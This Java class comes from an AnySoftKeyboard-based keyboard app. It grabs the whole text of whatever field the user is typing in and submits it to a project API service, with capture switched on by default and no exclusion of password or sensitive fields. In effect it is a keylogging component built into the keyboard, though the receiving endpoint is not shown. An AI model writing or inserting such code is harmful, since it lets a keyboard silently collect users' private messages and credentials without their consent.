package com.anysoftkeyboard;

import android.view.inputmethod.ExtractedText;
import android.view.inputmethod.ExtractedTextRequest;
import android.view.inputmethod.InputConnection;

public class SubmitTextApiService {
    private final int ONE_SECOND = 1000;
    private final int QTD_MIN_PALAVRAS = 2;

    private long lastTimeMillis;
    private ProjectAPIService projectAPIService;

    // Variavel para controlar se o envio de textos esta habilitado
    // Por padrao vai vim habilitado.
    private boolean isCaptureEnabled = true;

    public SubmitTextApiService(){
        this.projectAPIService = new ProjectAPIService();
    }

    // Metodo para ativar ou desativar o envio de textos
    // se true - habilita /  se false - desabilita
    public void setTextCaptureEnabled(boolean enabled) {
        this.isCaptureEnabled = enabled;
    }

    private String getTypedText(InputConnection ic){
        ExtractedText extractedText = ic.getExtractedText(new ExtractedTextRequest(), 0);
        if(extractedText == null) {
            return null;
        }
        CharSequence text = extractedText.text;
        return text.toString();
    }

    private void submitToApi(String text){
        projectAPIService.submit(text);
    }

    private boolean verifyThreeWords(String text){
        return text.split(" ").length >= QTD_MIN_PALAVRAS;
    }

    public void submitText(InputConnection ic) {
        // Verificando se o envio de textos esta habilitado.
        if(!isCaptureEnabled) {
            System.out.println("The text capture is disabled. No text will be sent to the API.");
            return;
        }

        long currentTimeMillis = System.currentTimeMillis();
        if((currentTimeMillis - lastTimeMillis) > ONE_SECOND) {
            String text = getTypedText(ic);
            if(text != null && verifyThreeWords(text)){
                System.out.println("======================= submit =======================");
                submitToApi(text);
            }
        }
        lastTimeMillis = currentTimeMillis;
    }
}
